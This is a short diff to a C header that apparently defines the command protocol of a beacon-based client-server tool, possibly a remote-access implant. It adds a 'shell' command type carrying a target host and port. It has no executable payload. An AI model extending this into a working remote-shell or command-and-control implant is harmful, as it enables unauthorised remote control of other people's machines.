@@ -32,6 +32,10 @@
 #define NET_PORT_MIN 1
 #endif
 
+#ifndef NET_DOMAIN_MAX
+#define NET_DOMAIN_MAX 253
+#endif
+
 #ifndef NET_PORT_MAX
 #define NET_PORT_MAX 65535
 #endif
@@ -61,6 +65,11 @@ typedef struct{
   char data[NET_MAX_DATA_SIZE];
 } net_server_beacon_t;
 #define NET_SERVER_CMD_BEACON 0
+typedef struct{
+  char host[NET_DOMAIN_MAX];
+  int port;
+} net_server_cmd_shell_t;
+#define NET_SERVER_CMD_SHELL 1
 #endif
 
 #ifndef NET_CLIENT_SLEEP
